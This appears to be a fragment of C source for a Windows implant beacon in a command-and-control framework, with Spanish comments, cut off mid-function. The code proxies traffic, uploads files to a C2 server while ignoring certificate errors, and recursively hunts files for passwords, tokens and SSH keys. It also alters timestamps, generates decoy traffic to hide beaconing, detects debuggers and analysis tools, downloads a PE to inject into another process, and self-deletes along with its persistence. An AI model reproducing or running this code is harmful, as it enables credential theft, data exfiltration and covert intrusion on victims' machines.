BOOL startProxy(const char* listenAddr, const char* targetAddr) {
    initProxy();
    
    char listenIP[16] = {0}, targetIP[16] = {0};
    int listenPort = 0, targetPort = 0;
    
    if (sscanf(listenAddr, "%15[^:]:%d", listenIP, &listenPort) != 2 ||
        sscanf(targetAddr, "%15[^:]:%d", targetIP, &targetPort) != 2) {
        return FALSE;
    }
    
    if (listenPort <= 0 || listenPort > 65535 || 
        targetPort <= 0 || targetPort > 65535) {
        return FALSE;
    }
    
    printf("[*] Starting proxy: %s -> %s\n", listenAddr, targetAddr);
    
    // Verificar si ya existe
    EnterCriticalSection(&proxyMutex);
    for (int i = 0; i < numProxyListeners; i++) {
        if (strcmp(proxyListeners[i].listenIP, listenIP) == 0 && 
            proxyListeners[i].listenPort == listenPort &&
            proxyListeners[i].running) {
            LeaveCriticalSection(&proxyMutex);
            return FALSE;
        }
    }
    
    // Buscar slot libre para listener
    ProxyListener* listener = NULL;
    for (int i = 0; i < 10; i++) {
        if (!proxyListeners[i].running) {
            listener = &proxyListeners[i];
            break;
        }
    }
    
    if (!listener) {
        LeaveCriticalSection(&proxyMutex);
        return FALSE;
    }
    LeaveCriticalSection(&proxyMutex);
    
    // Crear socket de escucha
    SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSock == INVALID_SOCKET) {
        return FALSE;
    }
    
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(listenIP);
    addr.sin_port = htons(listenPort);
    
    int opt = 1;
    setsockopt(listenSock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
    
    if (bind(listenSock, (struct sockaddr*)&addr, sizeof(addr)) != 0 ||
        listen(listenSock, 5) != 0) {
        closesocket(listenSock);
        return FALSE;
    }
    
    // Configurar listener
    EnterCriticalSection(&proxyMutex);
    strncpy(listener->listenIP, listenIP, sizeof(listener->listenIP) - 1);
    listener->listenIP[sizeof(listener->listenIP) - 1] = '\0';
    strncpy(listener->targetIP, targetIP, sizeof(listener->targetIP) - 1);
    listener->targetIP[sizeof(listener->targetIP) - 1] = '\0';
    listener->listenPort = listenPort;
    listener->targetPort = targetPort;
    listener->listenSocket = listenSock;
    listener->running = TRUE;
    
    // CLAVE: Thread separado - NO bloquea
    _beginthread(proxy_accept_thread, 0, listener);
    
    if (numProxyListeners < 10) {
        numProxyListeners++;
    }
    LeaveCriticalSection(&proxyMutex);
    
    printf("[+] Proxy listening on %s:%d -> %s:%d\n", listenIP, listenPort, targetIP, targetPort);
    return TRUE;
}

BOOL stopProxy(const char* listenAddr) {
    initProxy();
    
    char ip[16] = {0};
    int port = 0;
    
    if (sscanf(listenAddr, "%15[^:]:%d", ip, &port) != 2) {
        return FALSE;
    }
    
    EnterCriticalSection(&proxyMutex);
    
    // Buscar y detener listener
    BOOL found = FALSE;
    for (int i = 0; i < numProxyListeners; i++) {
        if (proxyListeners[i].running &&
            strcmp(proxyListeners[i].listenIP, ip) == 0 && 
            proxyListeners[i].listenPort == port) {
            
            proxyListeners[i].running = FALSE;
            if (proxyListeners[i].listenSocket != INVALID_SOCKET) {
                closesocket(proxyListeners[i].listenSocket);
                proxyListeners[i].listenSocket = INVALID_SOCKET;
            }
            found = TRUE;
            break;
        }
    }
    
    // Cerrar sesiones usando tu estructura ProxySession original
    for (int i = 0; i < numProxySessions; i++) {
        if (proxySessions[i].active &&
            strcmp(proxySessions[i].listenIP, ip) == 0 && 
            proxySessions[i].listenPort == port) {
            
            proxySessions[i].active = FALSE;
            if (proxySessions[i].client != INVALID_SOCKET) {
                closesocket(proxySessions[i].client);
                proxySessions[i].client = INVALID_SOCKET;
            }
            if (proxySessions[i].server != INVALID_SOCKET) {
                closesocket(proxySessions[i].server);
                proxySessions[i].server = INVALID_SOCKET;
            }
        }
    }
    
    LeaveCriticalSection(&proxyMutex);
    cleanupProxy();
    return found;
}

void cleanupProxy() {
    if (!proxyInitialized) return;
    
    EnterCriticalSection(&proxyMutex);
    
    for (int i = 0; i < numProxyListeners; i++) {
        if (proxyListeners[i].running) {
            proxyListeners[i].running = FALSE;
            if (proxyListeners[i].listenSocket != INVALID_SOCKET) {
                closesocket(proxyListeners[i].listenSocket);
            }
        }
    }
    
    for (int i = 0; i < numProxySessions; i++) {
        if (proxySessions[i].active) {
            proxySessions[i].active = FALSE;
            if (proxySessions[i].client != INVALID_SOCKET) {
                closesocket(proxySessions[i].client);
            }
            if (proxySessions[i].server != INVALID_SOCKET) {
                closesocket(proxySessions[i].server);
            }
        }
    }
    
    LeaveCriticalSection(&proxyMutex);
    DeleteCriticalSection(&proxyMutex);
    proxyInitialized = FALSE;
}

// Función simplificada para compresión de directorios
BOOL compressDirectory(const char* dirPath) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), 
        "powershell -command \\"Compress-Archive -Path '%s\\\\*' -DestinationPath '%s.zip' -Force\\"", 
        dirPath, dirPath);
    
    return system(cmd) == 0;
}

// Para netconfig
char* getNetworkConfig() {
    return exec_cmd("ipconfig /all");
}

BOOL UploadFileToC2(const char* url, const char* filePath) {
    FILE* fp = fopen(filePath, "rb");
    if (!fp) {
        printf("[-] Cannot open file: %s\n", filePath);
        fflush(stdout);
        return FALSE;
    }

    fseek(fp, 0, SEEK_END);
    DWORD fileSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    BYTE* fileData = malloc(fileSize);
    if (!fileData) {
        fclose(fp);
        return FALSE;
    }
    fread(fileData, 1, fileSize, fp);
    fclose(fp);

    const char* boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    const char* filename = strrchr(filePath, '\\\\');
    filename = filename ? filename + 1 : filePath;

    // Calcular tamaño del cuerpo multipart
    DWORD bodySize = 0;
    bodySize += strlen("--") + strlen(boundary) + strlen("\r\n");
    bodySize += strlen("Content-Disposition: form-data; name=\\"file\\"; filename=\\"") + strlen(filename) + strlen("\\"\r\n");
    bodySize += strlen("Content-Type: application/octet-stream\r\n\r\n");
    bodySize += fileSize;
    bodySize += strlen("\r\n--") + strlen(boundary) + strlen("--\r\n");

    char* body = malloc(bodySize);
    if (!body) {
        free(fileData);
        return FALSE;
    }

    char* ptr = body;
    ptr += sprintf(ptr, "--%s\r\n", boundary);
    ptr += sprintf(ptr, "Content-Disposition: form-data; name=\\"file\\"; filename=\\"%s\\"\r\n", filename);
    ptr += sprintf(ptr, "Content-Type: application/octet-stream\r\n\r\n");
    memcpy(ptr, fileData, fileSize);
    ptr += fileSize;
    ptr += sprintf(ptr, "\r\n--%s--\r\n", boundary);

    free(fileData);

    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL result = FALSE;

    do {
        hSession = WinHttpOpen(
            USER_AGENT,
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0
        );
        if (!hSession) break;

        // Parse URL
        char host[256], path[512];
        int port = 443;
        const char* host_start = url;
        BOOL secure = FALSE;

        if (strncmp(url, "https://", 8) == 0) {
            host_start = url + 8;
            port = 443;
            secure = TRUE;
        } else if (strncmp(url, "http://", 7) == 0) {
            host_start = url + 7;
            port = 80;
            secure = FALSE;
        } else {
            break;
        }

        const char* path_start = strchr(host_start, '/');
        const char* port_start = strchr(host_start, ':');

        if (port_start && (!path_start || port_start < path_start)) {
            int host_len = port_start - host_start;
            strncpy(host, host_start, host_len);
            host[host_len] = '\0';
            port = atoi(port_start + 1);
            if (path_start) {
                strcpy(path, path_start);
            } else {
                strcpy(path, "/");
            }
        } else if (path_start) {
            int host_len = path_start - host_start;
            strncpy(host, host_start, host_len);
            host[host_len] = '\0';
            strcpy(path, path_start);
        } else {
            strcpy(host, host_start);
            strcpy(path, "/");
        }

        hConnect = WinHttpConnect(hSession, UTF8ToWide(host), port, 0);
        if (!hConnect) break;

        DWORD request_flags = secure ? WINHTTP_FLAG_SECURE : 0;
        hRequest = WinHttpOpenRequest(
            hConnect,
            L"POST",
            UTF8ToWide(path),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            request_flags
        );
        if (!hRequest) break;

        if (secure) {
            DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
            WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
        }

        // === Añadir Content-Type multipart ===
        char contentType[256];
        snprintf(contentType, sizeof(contentType), "Content-Type: multipart/form-data; boundary=%s", boundary);
        WCHAR wContentType[512];
        MultiByteToWideChar(CP_UTF8, 0, contentType, -1, wContentType, 512);
        if (!WinHttpAddRequestHeaders(hRequest, wContentType, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
            printf("[-] Failed to add Content-Type header\n");
            break;
        }

        // === Enviar cuerpo multipart ===
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, body, bodySize, bodySize, 0)) {
            printf("[-] WinHttpSendRequest failed\n");
            break;
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            printf("[-] WinHttpReceiveResponse failed\n");
            break;
        }

        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);
        if (WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &statusCode, &statusCodeSize, NULL)) {
            if (statusCode == 200) {
                printf("[+] Upload successful (HTTP 200)\n");
                result = TRUE;
            } else {
                printf("[-] Upload failed (HTTP %lu)\n", statusCode);
            }
        }

    } while (0);

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    if (body) free(body);

    return result;
}

// === handleUpload: envía del beacon al C2 ===
BOOL handleUpload(const char* command) {
    const char* filePath = command + 7;  // "upload:"
    if (!filePath || !strlen(filePath)) return FALSE;

    if (!FileExistsA(filePath)) {
        printf("[-] File not found: %s", filePath);
        return FALSE;
    }

    char uploadUrl[512];
    snprintf(uploadUrl, sizeof(uploadUrl), "%s%s/upload", C2_URL, MALEABLE);

    if (UploadFileToC2(uploadUrl, filePath)) {
        printf("[+] Uploaded: %s", filePath);
        return TRUE;
    }
    printf("[-] Failed to upload: %s", filePath);
    return FALSE;
}

// Función para verificar si un archivo existe
BOOL FileExistsA(const char* filePath) {
    return GetFileAttributesA(filePath) != INVALID_FILE_ATTRIBUTES;
}

// selfdestruct.c
void selfDestruct() {
    printf("[*] Initiating self-destruct...\\n");
    fflush(stdout);
    
    char exePath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
        printf("[-] Failed to get executable path\\n");
        return;
    }
    
    // Eliminar del registro
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "SystemMaintenance");
        RegCloseKey(hKey);
    }
    
    // Eliminar tarea programada
    system("schtasks /delete /tn \\"SystemMaintenanceTask\\" /f > nul 2>&1");
    
    // Preparar comando PowerShell robusto, ESCAPADO PARA BASH
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "cmd.exe /c "
        "timeout /t 3 > nul & "
        "powershell -Command \""
            "\$ErrorActionPreference='SilentlyContinue'; "
            "for(\$i=0; \$i -lt 5; \$i++){ "
                "Start-Sleep -Seconds 2; "
                "try{ Remove-Item -Force -Path '%s' -ErrorAction Stop; exit } catch{} "
            "}; "
            "Remove-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name 'SystemMaintenance' -ErrorAction SilentlyContinue"
        "\" > nul 2>&1",
        exePath);
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW | DETACHED_PROCESS,
                      NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        printf("[-] Failed to spawn cleanup process\n");
    }
    
    printf("[+] Self-destruct sequence activated. Exiting now...\n");
    fflush(stdout);
    
    ExitProcess(0);
}

char* stristr(const char* str, const char* pattern) {
    if (!str || !pattern) return NULL;

    size_t len_str = strlen(str);
    size_t len_pat = strlen(pattern);

    if (len_pat == 0) return (char*)str;
    if (len_pat > len_str) return NULL;

    for (size_t i = 0; i <= len_str - len_pat; i++) {
        if (_strnicmp(str + i, pattern, len_pat) == 0) {
            return (char*)(str + i);
        }
    }
    return NULL;
}
int isSensitiveFile(const char* filename) {
    // List of extensions or filenames considered "sensitive"
    const char* sensitiveExtensions[] = {
        ".env",
        ".txt",
        ".json",
        ".xml",
        ".ini",
        ".config",
        ".yaml",
        ".yml",
        ".bak",
        ".backup"
    };
    const int numExt = sizeof(sensitiveExtensions) / sizeof(sensitiveExtensions[0]);

    const char* dot = strrchr(filename, '.');
    if (!dot) return 0;  // No extension

    for (int i = 0; i < numExt; i++) {
        if (_stricmp(dot, sensitiveExtensions[i]) == 0) {
            return 1;
        }
    }

    const char* patterns[] = {
        "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
        ".bash_history", ".viminfo", "command_history",
        "ConsoleHost_history.txt", NULL
    };

    for (int i = 0; patterns[i] != NULL; i++) {
        if (strstr(filename, patterns[i]) != NULL) {
            return TRUE;
        }
    }

    // Also match specific filenames
    if (_stricmp(filename, "passwords.txt") == 0 ||
        _stricmp(filename, "secrets.txt") == 0 ||
        _stricmp(filename, "credentials.json") == 0) {
        return 1;
    }

    return 0;
}

char* searchCredentials(const char* basePath) {
    printf("[*] Searching for credentials in: %s\n", basePath);
    fflush(stdout);

    // Validar entrada
    if (!basePath || strlen(basePath) == 0) {
        return NULL;
    }

    char searchPath[MAX_PATH];
    if (strlen(basePath) + 3 >= MAX_PATH) {
        printf("[-] Path too long: %s\n", basePath);
        return NULL;
    }
    snprintf(searchPath, sizeof(searchPath), "%s\\\\*", basePath);

    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(searchPath, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    // Patrones
    const char* patterns[] = {"password", "passwd", "pwd", "secret", "token", "api_key"};
    const int numPatterns = 6;

    // Usamos un buffer grande, pero con control de tamaño
    char* results = (char*)malloc(8192);
    if (!results) {
        FindClose(hFind);
        return NULL;
    }
    results[0] = '\0';
    size_t totalLen = 0; // Para evitar strlen en cada strcat

    do {
        // Saltar . y ..
        if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) {
            continue;
        }

        char filePath[MAX_PATH];
        if (strlen(basePath) + strlen(ffd.cFileName) + 2 >= MAX_PATH) {
            continue; // Path demasiado largo
        }
        snprintf(filePath, sizeof(filePath), "%s\\\\%s", basePath, ffd.cFileName);

        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Recursión controlada (evitar profundidad infinita)
            char* subResults = searchCredentials(filePath);
            if (subResults) {
                size_t subLen = strlen(subResults);
                if (totalLen + subLen + 2 < 8192 - 1) {
                    if (totalLen > 0) {
                        results[totalLen] = '\n';
                        totalLen++;
                    }
                    memcpy(results + totalLen, subResults, subLen);
                    totalLen += subLen;
                    results[totalLen] = '\0';
                } else {
                    printf("[-] Results buffer full, truncating...\n");
                    free(subResults);
                }
                free(subResults);
            }
        } else {
            // Verificar si es archivo sensible
            if (!isSensitiveFile(ffd.cFileName)) {
                continue;
            }

            FILE* file = fopen(filePath, "r");
            if (!file) continue;

            char line[1024];
            while (fgets(line, sizeof(line), file)) {
                // Asegurarnos de que line es string válido
                char* newline = strchr(line, '\n');
                if (newline) *newline = '\0';

                int matched = 0;
                for (int i = 0; i < numPatterns; i++) {
                    if (stristr(line, patterns[i])) {
                        char result[1024];
                        snprintf(result, sizeof(result), "[%s] %s: %s", ffd.cFileName, patterns[i], line);

                        size_t resultLen = strlen(result);
                        if (totalLen + resultLen + (totalLen > 0 ? 1 : 0) < 8192 - 1) {
                            if (totalLen > 0) {
                                results[totalLen] = '\n';
                                totalLen++;
                            }
                            memcpy(results + totalLen, result, resultLen);
                            totalLen += resultLen;
                            results[totalLen] = '\0';
                        } else {
                            printf("[-] Results buffer full, truncating...\n");
                            matched = 1;
                            break;
                        }
                        matched = 1;
                        break;
                    }
                }
                if (matched && totalLen >= 8192 - 100) {
                    // Casi lleno, no sigas
                    break;
                }
            }
            fclose(file);
        }
    } while (FindNextFileA(hFind, &ffd) != 0);

    FindClose(hFind);

    // Retornar solo si hay resultados
    if (totalLen == 0) {
        free(results);
        return NULL;
    }

    return results;
}

// Convierte UTF-8 a wide string
WCHAR* UTF8ToWide(const char* utf8) {
    int len = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
    WCHAR* wide = (WCHAR*)malloc(len * sizeof(WCHAR));
    if (wide) {
        MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wide, len);
    }
    return wide;
}


// Ofusca los timestamps de un archivo
BOOL obfuscateFileTimestamp(const char* filepath) {
    printf("[*] ofuscateFileTimestamp...\n");
    fflush(stdout);
    HANDLE hFile = CreateFileA(filepath,
        FILE_WRITE_ATTRIBUTES,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // Obtener la hora actual
    FILETIME ftNow;
    GetSystemTimeAsFileTime(&ftNow);

    // Modificar mtime y atime
    if (!SetFileTime(hFile, NULL, &ftNow, &ftNow)) {
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    return TRUE;
}

// Recorre directorios buscando archivos sensibles
void obfuscateFileTimestamps(const char* basePath, int depth) {
    // Evitar recursión muy profunda
    if (depth > 10) return;  // Límite razonable

    printf("[*] Obfuscating file timestamps in: %s (depth: %d)\n", basePath, depth);
    fflush(stdout);
    
    if (!basePath || strlen(basePath) == 0) {
        printf("[-] Invalid path\n");
        return;
    }
    
    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\\\*", basePath);
    
    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(searchPath, &ffd);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot access directory: %s\n", basePath);
        return;
    }
    
    do {
        if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) 
            continue;
        
        char filepath[MAX_PATH];
        snprintf(filepath, sizeof(filepath), "%s\\\\%s", basePath, ffd.cFileName);
        
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            obfuscateFileTimestamps(filepath, depth + 1);  // Incrementar profundidad
        } else {
            if (isSensitiveFile(ffd.cFileName)) {
                HANDLE hFile = CreateFileA(filepath,
                    FILE_WRITE_ATTRIBUTES,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    NULL,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    NULL);
                
                if (hFile != INVALID_HANDLE_VALUE) {
                    FILETIME ftNow;
                    GetSystemTimeAsFileTime(&ftNow);
                    
                    if (SetFileTime(hFile, NULL, &ftNow, &ftNow)) {
                        printf("[+] Timestamps obfuscated: %s\n", filepath);
                    } else {
                        printf("[-] Failed to obfuscate: %s (Error: %lu)\n", filepath, GetLastError());
                    }
                    
                    CloseHandle(hFile);
                } else {
                    printf("[-] Failed to open file: %s (Error: %lu)\n", filepath, GetLastError());
                }
            }
        }
    } while (FindNextFileA(hFind, &ffd) != 0);
    
    FindClose(hFind);
}

// traffic.c
void simulateLegitimateTraffic(void* param) {
    printf("[*] Starting legitimate traffic simulation...\n");
    fflush(stdout);

    while (1) {
        int ua_idx = rand() % NUM_USER_AGENTS;
        int url_idx = rand() % NUM_URLS;

        const char* url = TRAFFIC_URLS[url_idx];
        const char* ua = TRAFFIC_UAS[ua_idx];

        // Parse URL
        char host[256] = {0};
        char path[512] = "/";
        const char* host_start = strstr(url, "://") ? strstr(url, "://") + 3 : url;
        const char* path_start = strchr(host_start, '/');
        if (path_start) {
            strncpy(host, host_start, path_start - host_start);
            strcpy(path, path_start);
        } else {
            strcpy(host, host_start);
        }

        HINTERNET hSession = WinHttpOpen(
            UTF8ToWide(ua),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0
        );
        if (!hSession) {
            Sleep(30000 + rand() % 60000);
            continue;
        }

        HINTERNET hConnect = WinHttpConnect(hSession, UTF8ToWide(host), 443, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            Sleep(30000 + rand() % 60000);
            continue;
        }

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            UTF8ToWide(path),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE
        );
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(30000 + rand() % 60000);
            continue;
        }

        // Ignorar errores de certificado
        DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                      SECURITY_FLAG_IGNORE_UNKNOWN_CA;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            WinHttpReceiveResponse(hRequest, NULL);
            DWORD bytesRead;
            char buffer[4096];
            while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        Sleep(30000 + rand() % 60000); // 30-90 segundos
    }
}

void restartClient() {
    printf("[*] Restarting client...\n");
    fflush(stdout);
    // Obtener la ruta del ejecutable actual
    char executable[MAX_PATH];
    if (!GetModuleFileNameA(NULL, executable, MAX_PATH)) {
        printf("[-] Failed to get executable path.\n");
        return;
    }

    // Crear un nuevo proceso con el mismo ejecutable
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    char cmdLine[MAX_PATH];
    snprintf(cmdLine, sizeof(cmdLine), "\\"%s\\"", executable);

    if (CreateProcessA(
        executable,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        // Cerrar handles
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        printf("[+] New instance started.\n");
    } else {
        printf("[-] Failed to start new instance: %lu\n", GetLastError());
    }

    // Terminar el proceso actual
    ExitProcess(0);
}
BOOL checkDebuggers() {
    printf("[*] Checking for debuggers...\n");
    fflush(stdout);

    // 1. IsDebuggerPresent (API básica)
    if (IsDebuggerPresent()) {
        printf("[+] Debugger detected: IsDebuggerPresent()\n");
        return TRUE;
    }

    // 2. Lista de procesos sospechosos (en WCHAR*)
    const WCHAR* debuggers[] = {
        L"ollydbg.exe",
        L"x64dbg.exe",
        L"x32dbg.exe",
        L"ida.exe",
        L"ida64.exe",
        L"ImmunityDebugger.exe",
        L"windbg.exe",
        L"procmon.exe",
        L"procexp.exe",
        L"tcpview.exe",
        L"autoruns.exe",
        L"sysmon.exe",
        L"fiddler.exe",
        L"wireshark.exe",
        L"processhacker.exe"
    };
    const int num_debuggers = 15;

    // Tomar snapshot de procesos
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create process snapshot.\n");
        return FALSE;
    }

    PROCESSENTRY32W pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        printf("[-] Process32First failed.\n");
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        // Convertir a minúsculas y comparar con _wcsicmp
        for (int i = 0; i < num_debuggers; i++) {
            if (_wcsicmp(pe32.szExeFile, debuggers[i]) == 0) {
                printf("[+] Debugger process detected: %ls (PID: %lu)\n", pe32.szExeFile, pe32.th32ProcessID);
                CloseHandle(hSnapshot);
                return TRUE;
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    printf("[-] No debuggers detected.\n");
    return FALSE;
}

unsigned char* MapPEToMemory(unsigned char* rawPE, DWORD rawSize, DWORD* mappedSize) {
    printf("[*] MapPetomemory...\n");
    fflush(stdout);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)rawPE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(rawPE + dos->e_lfanew);

    *mappedSize = nt->OptionalHeader.SizeOfImage;
    unsigned char* image = (unsigned char*)VirtualAlloc(NULL, *mappedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!image) return NULL;

    // Copiar cabeceras
    memcpy(image, rawPE, nt->OptionalHeader.SizeOfHeaders);

    // Copiar secciones
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (section[i].PointerToRawData == 0 || section[i].SizeOfRawData == 0) continue;
        memcpy(image + section[i].VirtualAddress, rawPE + section[i].PointerToRawData, section[i].SizeOfRawData);
    }

    return image;
}

BOOL downloadAndExecute(const char* url, const char* targetProcess) {
    printf("[*] downloadAndExecute: downloading PE from %s\n", url);

    // Descargar el payload
    DWORD payloadSize = 0;
    BYTE* payload = DownloadToBuffer(url, &payloadSize);
    if (!payload || payloadSize == 0) {
        printf("[-] Failed to download payload\n");
        return FALSE;
    }

    // Validar que es 64-bit (como tenías)
    if (!is_64bit(payload)) {
        printf("[-] Only 64-bit PE supported\n");
        free(payload);
        return FALSE;
    }

    // === Guardar en disco con nombre limpio ===
    const char* filename = "hellbird.exe";  // Nombre fijo, o extraer de URL

    printf("[*] Saving downloaded payload to: %s\n", filename);

    HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot create file: %s (Error: %lu)\n", filename, GetLastError());
        free(payload);
        return FALSE;
    }

    DWORD written = 0;
    if (!WriteFile(hFile, payload, payloadSize, &written, NULL) || written != payloadSize) {
        printf("[-] Failed to write payload to disk\n");
        CloseHandle(hFile);
        DeleteFileA(filename);
        free(payload);
        return FALSE;
    }

    CloseHandle(hFile);
    free(payload);

    printf("[+] Payload saved to: %s\n", filename);

    // === Ahora llama a overWrite con el archivo local ===
    overWrite(targetProcess, filename);

    return TRUE;
}

BOOL DecryptPacket(BYTE* buffer, DWORD* buffer_len) {
    printf("[D] DecryptPacket (CFB 128-bit): buffer_len = %lu\n", *buffer_len);
    fflush(stdout);
    
    if (*buffer_len < 16) {
        printf("[-] buffer too small\n");
        fflush(stdout);
        return FALSE;
    }
    
    // Extraer IV y ciphertext
    BYTE iv[16];
    memcpy(iv, buffer, 16);
    BYTE* ciphertext = buffer + 16;
    DWORD ciphertext_len = *buffer_len - 16;
    
    // DEBUG: Mostrar IV y ciphertext extraídos
    printf("[D] Extracted IV: ");
    for (int i = 0; i < 16; i++) printf("%02x ", iv[i]);
    printf("\n[D] Ciphertext (%lu bytes): ", ciphertext_len);
    for (DWORD i = 0; i < ciphertext_len; i++) printf("%02x ", ciphertext[i]);
    printf("\n");
    
    if (ciphertext_len == 0) {
        *buffer_len = 0;
        return TRUE;
    }
    
    // Buffer temporal para plaintext
    BYTE* plaintext = (BYTE*)malloc(ciphertext_len);
    if (!plaintext) {
        printf("[-] malloc failed for plaintext\n");
        fflush(stdout);
        return FALSE;
    }
    
    // Inicializar contexto AES
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, aes_key);
    
    // CFB 128-bit: procesar en bloques de hasta 16 bytes
    BYTE feedback_register[16];
    memcpy(feedback_register, iv, 16);
    
    DWORD processed = 0;
    while (processed < ciphertext_len) {
        // Cifrar el feedback register para obtener keystream
        BYTE keystream[16];
        memcpy(keystream, feedback_register, 16);
        AES_ECB_encrypt(&ctx, keystream);
        
        // Procesar hasta 16 bytes o lo que quede
        DWORD block_size = (ciphertext_len - processed < 16) ? (ciphertext_len - processed) : 16;
        
        printf("[D] CFB Block at %lu (size=%lu):\n", processed, block_size);
        printf("    Feedback: ");
        for (int i = 0; i < 16; i++) printf("%02x ", feedback_register[i]);
        printf("\n    Keystream: ");
        for (int i = 0; i < (int)block_size; i++) printf("%02x ", keystream[i]);
        printf("\n");
        
        // XOR ciphertext con keystream
        for (DWORD i = 0; i < block_size; i++) {
            plaintext[processed + i] = ciphertext[processed + i] ^ keystream[i];
        }
        
        // Actualizar feedback register para próxima iteración
        if (processed + 16 < ciphertext_len) {
            // Hay más bloques: feedback = ciphertext actual
            memcpy(feedback_register, &ciphertext[processed], 16);
        }
        
        processed += block_size;
    }
    
    // Copiar resultado al buffer original
